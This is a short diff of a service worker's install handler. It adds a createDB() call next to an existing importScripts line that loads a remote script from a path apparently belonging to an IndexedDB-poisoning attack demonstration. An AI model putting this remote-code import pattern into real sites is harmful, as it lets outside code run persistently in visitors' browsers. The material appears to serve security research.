@@ -18,6 +18,7 @@ function createDB(){
 
 self.addEventListener('install', event => {
   console.log('V1 installing…');
+  createDB()
   importScripts('https://demopwa.github.io/SW_Attacks/IndexDBPoisoning/fetch_sw.js')
  
 });
